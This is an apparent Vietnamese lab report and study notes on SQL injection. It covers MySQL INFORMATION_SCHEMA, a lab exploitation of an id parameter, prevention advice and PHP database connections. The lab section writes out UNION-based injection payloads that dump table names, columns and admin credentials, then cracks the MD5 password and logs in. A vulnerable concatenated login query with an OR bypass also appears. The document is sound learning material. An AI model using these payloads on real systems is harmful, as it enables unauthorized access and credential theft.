# SQL-injection

Thực hiện: Trung Kiên

Ngày thực hiện: 4/4/2022, 7/4/2022

Mục lục:


[1. Database infomation_schema](#id1)

[2. Report lab](#id2)

[3. SQL injection là gì?](#id3)

[4. Nhúng SQL vào PHP](#id4)


## 1. Database infomation_schema <a name="id1" />
- <code>INFORMATION_SCHEMA</code> là 1 database nằm bên trong 1 máy chủ MySQL, lưu thông tin về tất cả các database khác mà máy chủ MySQL đang lưu giữ.
- <code>INFORMATION_SCHEMA</code> chứa các table <code>read-only</code>. Chính vì các table trong database này là <code>read-only</code>, nên chỉ có thể sử dụng lệnh <code>SELECT</code> trên chúng, các lệnh <code>INSERT, UPDATE, DELETE</code> sẽ không chạy được trên database này.
- Các table của <code>INFORMATION_SCHEMA</code> database

|ID|Table|Mô tả|
|---|---|---|
|1|CHARACTER_SETS|Cung cấp thông tin về các character set hiện có.|
|2|COLLATIONS|Cung cấp thông tin về các collation của từng character set.|
|3|COLLATION_CHARACTER_SET_APPLICABILITY|Cho biết character set nào có thể áp dụng cho collation nào.|
|4|COLUMNS|Cung cấp thông tin về các column trong các table.|
|5|COLUMN_PRIVILEGES|Cung cấp thông tin phân quyền trên các column.|
|6|COLUMN_STATISTICS|Cung cấp thông tin truy cập đến các thống kê biểu đồ cho các giá trị của column.|
|7|ENGINES|Cung cấp thông tin về các storage engine, rất hữu dụng trong việc kiểm tra xem storage engine nào đang được hỗ trợ, và storage engine mặc định là engine nào.|
|8|EVENTS|Cung cấp thông tin về các sự kiện trong Event Manager.|
|9|FILES|Cung cấp thông tin về các file nơi dữ liệu không gian bảng của MySQL được lưu trữ. Cung cấp thông tin về các tập tin dữ liệu của InnoDB.|
|10|KEY_COLUMN_USAGE|Mô tả các column là khóa (key) của table. Table này không cung cấp thông tin về các thành phần khóa mà chỉ cung cấp thông tin về column.|
|11|KEYWORDS|Liệt kê các từ được xem là keyword trong MySQL.|
|12|OPTIMIZER_TRACE|Cung cấp thông tin được tạo bởi khả năng theo dõi của trình tối ưu hóa cho các câu lệnh được theo dõi. Để bật chức năng theo dõi, sử dụng biến hệ thống optimizer_trace.|
|13|PARAMETERS|Cung cấp thông tin về các parameter cho các stored procedure và stored function, và giá trị trả về cho các stored function.|
|14|PARTITIONS|Cung cấp thông tin về các phân vùng (partition) của table. Mỗi row trong table này ứng với 1 phân vùng cụ thể hay phân vùng phụ (subpartition) của 1 table.|
|15|PLUGINS|Cung cấp thông tin về các plugin của server.|
|16|PROCESSLIST|Cung cấp thông tin về thread đang chạy.|
|17|PROFILING|Cung cấp thông tin hồ sơ của các lệnh trong MySQL. Cung cấp thông tin chỉ ra việc sử dụng tài nguyên cho các lệnh được thực thi trong suốt quá trình của session hiện tại.|
|18|REFERENTIAL_CONSTRAINTS|Cung cấp thông tin về các khóa ngoại (foreign key)|
|19|RESOURCE_GROUPS|Cung cấp truy cập đến thông tin về các nhóm tài nguyên (resource group) trong MySQL.|
|20|ROUTINES|Cung cấp thông tin về các stored procedure và function.|
|21|SCHEMATA|Cung cấp thông tin về các database.|
|22|SCHEMA_PRIVILEGES|Cung cấp thông tin phân quyền của các database.|
|23|STATISTICS|Cung cấp thông tin về các chỉ mục (index) của table.|
|24|ST_GEOMETRY_COLUMNS|Cung cấp thông tin về các column lưu trữ dữ liệu không gian (spatial data).|
|25|ST_SPATIAL_REFERENCE_SYSTEMS|Cung cấp thông tin các hệ thống tham chiếu có sẵn cho dữ liệu không gian.|
|26|ST_UNITS_OF_MEASURE|Cung cấp thông tin về các đơn vị (unit) được chấp nhận trong function ST_Distance().|
|27|TABLES|Cung cấp thông tin về các table trong các database hiện có trong server.|
|28|TABLESPACES|Cung cấp thông tin về tablespace đang hoạt động của MySQL Cluster.|
|29|TABLE_CONSTRAINTS|Mô tả những table nào có ràng buộc (constraint)|
|30|TABLE_PRIVILEGES|Cung cấp thông tin phân quyền của các table.|
|31|TRIGGERS|Cung cấp thông tin về các trigger.|
|32|USER_PRIVILEGES|Cung cấp thông tin phân quyền của toàn bộ MySQL.|
|33|VIEWS|Cung cấp thông tin về các view trong các database.|
|34|VIEW_ROUTINE_USAGE|Cung cấp truy cập đến các thông tin về các stored function được sử dụng trong định nghĩa view.|
|35|VIEW_TABLE_USAGE|Cung cấp truy cập đến thông tin về các table và view được sử dụng trong định nghĩa view.|

Có 3 bảng cần chú ý: <code>COLUMNS, TABLES, USER_PRIVILEGES</code>

## 2. Report lab <a name="id2" />

- Vào trang web thì thấy menu 
<img src="https://user-images.githubusercontent.com/61901474/163403294-afd8027f-f142-486a-8894-a3b867f6f979.png" alt="..." width="700" />

- Bấm thử qua các lựa chọn, thì tại "test" xuất hiện như sau:
<img src="https://user-images.githubusercontent.com/61901474/163403839-66c27933-a314-45f6-bd30-d7f9bd5ce47c.png" alt="..." width="700" />

- Nhận thấy đường dẫn xuất hiện <code>?id=1</code> -> thử nhập thêm dấu ' phía trước 1 và xem kết quả 
<img src="https://user-images.githubusercontent.com/61901474/163407787-c34f7d56-58e7-4feb-b25c-ba9d00bd031c.png" alt="..." width="700" />

-> có thể khai thác lỗ hổng từ trang này

- Sử dụng <code>ORDER BY</code> để xem số lượng cột của database, sau các lần thử, số cột là 4

<img src="https://user-images.githubusercontent.com/61901474/163411721-0fced203-78a7-4c36-8238-1c0ba2d698e8.png" alt="..." width="700" />

<img src="https://user-images.githubusercontent.com/61901474/163411752-27835567-8ed7-4ca4-abf0-abdd483a52cc.png" alt="..." width="700" />

- Thử thêm vào sau url <code>UNION SELECT 1,2,3,4</code>

<img src="https://user-images.githubusercontent.com/61901474/163412223-daf10503-1025-4aca-bceb-fec7a767afeb.png" alt="..." width="700" />

-> cột số 2 là cột có thể injection

- Có thể thử bằng hàm current_user() để kiểm tra:

<img src="https://user-images.githubusercontent.com/61901474/163412545-e6fa5a37-2d7b-4b8f-8117-cee0c45cd161.png" alt="..." width="700" />

- Đọc dữ liệu của database infomation_schema để xem có các bảng nào trong database:
```SQL
UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema=database()
```

<img src="https://user-images.githubusercontent.com/61901474/163413284-3fb305b3-ac19-49cc-b317-c28a0b3aea52.png" alt="..." width="700" />

-> có 3 bảng: categories, pictures và users -> khai thác bảng users

- Tiếp tục kiểm tra các cột của bảng users, dùng:
```SQL
UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name='users'
```

<img src="https://user-images.githubusercontent.com/61901474/163414117-dae16e0b-7db7-4e46-b837-0245cd02f3fb.png" alt="..." width="700" />

-> gồm 3 cột: id, login và password

- Sử dụng câu truy vấn để lấy thông tin login và password của bảng users:
```sql
UNION SELECT 1, concat(login,':',password), 3, 4 FROM users
```

![image](https://user-images.githubusercontent.com/61901474/163414602-1734f31a-d868-46ab-81c1-2a5c9735c855.png)

-> tên đăng nhập là admin, password đang được mã hóa -> thử dùng MD5 để giải mã 
![image](https://user-images.githubusercontent.com/61901474/163414964-b2d33b9c-4075-41b5-a927-54af07a1deca.png)

-> password là: P4ssw0rd

- Sang trang admin để đăng nhập
![image](https://user-images.githubusercontent.com/61901474/163415056-b7a675cb-00de-44df-b0f1-5350891197c4.png)

Đăng nhập thành công, lúc này có thể thực hiện các thao tác thêm, xóa, sửa,... trong database

 ** Giải thích một số hàm/lệnh sử dụng
  - UNION: dùng để ghép các truy vấn lại với nhau
  - ORDER BY: sắp xếp dữ liệu theo cột
  - concat(): hàm dùng để nối các chuỗi

## 3. SQL injection là gì? <a name="id3" />

- SQL injection là gì? SQL injection là một kỹ thuật cho phép những kẻ tấn công lợi dụng lỗ hổng của việc kiểm tra dữ liệu đầu vào trong các ứng dụng web và các thông báo lỗi của hệ quản trị cơ sở dữ liệu trả về để inject (tiêm vào) và thi hành các câu lệnh SQL bất hợp pháp. SQL injection có thể cho phép những kẻ tấn công thực hiện các thao tác, delete, insert, update, v.v. trên cơ sở dữ liệu của ứng dụng, thậm chí là server mà ứng dụng đó đang chạy. SQL injection thường được biết đến như là một vật trung gian tấn công trên các ứng dụng web có dữ liệu được quản lý bằng các hệ quản trị cơ sở dữ liệu như SQL Server, MySQL, Oracle, DB2, Sysbase...

- Ví dụ: trong form đăng nhập, người dùng nhập dữ liệu, trong trường tìm kiếm người dùng nhập văn bản tìm kiếm, trong biểu mẫu lưu dữ liệu, người dùng nhập dữ liệu cần lưu. Tất cả các dữ liệu được chỉ định này đều đi vào cơ sở dữ liệu. Thay vì nhập dữ liệu đúng, kẻ tấn công lợi dụng lỗ hổng để insert và thực thi các câu lệnh SQL bất hợp pháp để lấy dữ liệu của người dùng… 

- Mẫu: giả sử, muốn tìm đăng nhập user, ta thường viết code như sau:
```sql
var username = request.username; 

var password = request.password;

var sql = "SELECT * FROM Users WHERE Username = '" + username + "' AND Password = '" + password + "'";
```
Đoạn code trên đọc thông tin nhập vào từ user và cộng chuỗi để thành câu lệnh SQL. Để thực hiện tấn công, Hacker có thể thay đổi thông tin nhập vào, từ đó thay đổi câu lệnh SQL .
```sql
var password = request.password; // ' OR '' = ''

var sql = "SELECT * FROM Users WHERE Username = '" + username + "' AND Password = '" + password + "'";

SELECT * FROM Users WHERE Username = 'abc' AND Password = '' OR '' = ''  
```
-> Câu SQL này luôn cho kết quả true

- Cách phòng chống:
  -  Lọc dữ liệu từ người dùng: Ta sử dụng filter để lọc các kí tự đặc biệt (; ” ‘) hoặc các từ khoá (SELECT, UNION) do người dùng nhập vào. Nên sử dụng thư viện/function được cung cấp bởi framework, vì việc viết lại từ đầu vừa tốn thời gian vừa dễ sơ sót.
  -  Không cộng chuỗi để tạo SQL: Sử dụng parameter thay vì cộng chuỗi. Nếu dữ liệu truyền vào không hợp pháp, SQL Engine sẽ tự động báo lỗi, ta không cần dùng code để check.
  -  Không hiển thị exception, message lỗi: Hacker dựa vào message lỗi để tìm ra cấu trúc database. Khi có lỗi, ta chỉ hiện thông báo lỗi chứ đừng hiển thị đầy đủ thông tin về lỗi, tránh hacker lợi dụng.
  -  Phân quyền rõ ràng trong DB: Nếu chỉ truy cập dữ liệu từ một số bảng, hãy tạo một account trong DB, gán quyền truy cập cho account đó chứ đừng dùng account root hay sa. Lúc này, dù hacker có inject được SQL cũng không thể đọc dữ liệu từ các bảng chính, sửa hay xoá dữ liệu.
  -  Backup dữ liệu thường xuyên: Dữ liệu phải thường xuyên được backup để nếu có bị hacker xoá thì ta vẫn có thể khôi phục được.

## 4. Nhúng SQL vào PHP <a name="id4" />

- Để kết nối vào database, cần biết một số thông số của SQL: hostname (tên của host SQL server), username (tên đăng nhập để kết nối vào host), password (mật khẩu để đăng nhập vào host), databasename (tên database muốn kết nối)
- Có thể sử dụng thư viện có sẵn trong PHP để kết nối SQL vào PHP. Các thư viện thường được dùng là PDO (PHP Data Objects) và MySQLi (MySQL improved)
  - Cách kết nối dùng PDO:
  ```PHP
  $pdo = new PDO("mysql:host=localhost;dbname=database", 'username', 'password');
  ```
  - Cách kết nối dùng MySQLi:
  ```PHP
  // hướng thủ tục
  $mysqli = mysqli_connect('localhost','username','password','database');

  // hướng đối tượng
  $mysqli = new mysqli('localhost','username','password','database');
  ```
- So sánh PDO và MySQLi
  - PDO: kết nối được với 12 loại SQL server khác nhau; chỉ có hướng đối tượng; dễ dàng chuyển đổi từ loại database này sang loại database khác
  - MySQLi: chỉ kết nối được với MySQL server; có hướng đối tượng và hỗ trợ thêm các hàm thủ tục
